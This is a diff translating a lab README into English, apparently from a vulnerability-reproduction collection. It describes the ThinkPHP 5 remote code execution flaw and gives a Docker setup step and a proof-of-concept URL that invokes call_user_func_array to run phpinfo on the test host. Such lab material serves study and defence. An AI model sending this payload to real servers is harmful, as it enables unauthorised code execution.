@@ -1,25 +1,27 @@
-# ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞
+# Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability
 
-ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。
+[中文版本(Chinese version)](README.zh-cn.md)
 
-参考链接：
+ThinkPHP is an extremely widely used PHP development framework in China. In its version 5, as the framework processes controller name incorrectly, it can execute any method if the website doesn't have mandatory routing enabled (which is default), resulting in a RCE vulnerability. 
+
+Reference links：
 
 - http://www.thinkphp.cn/topic/60400.html
 - http://www.thinkphp.cn/topic/60390.html
 - https://xz.aliyun.com/t/3570
 
-## 漏洞环境
+## Environment Setup
 
-运行ThinkPHP 5.0.20版本：
+Enter the following command：(ThinkPHP version:5.0.20)
 
 ```
 docker-compose up -d
 ```
 
-环境启动后，访问`http://your-ip:8080`即可看到ThinkPHP默认启动页面。
+Visit `http://your-ip:8080` and you'll see the default page of ThinkPHP.
 
-## 漏洞复现
+## POC
 
-直接访问`http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`，即可执行phpinfo：
+Directly visit `http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1` and it'll execute the phpinfo：
 
 ![](1.png)
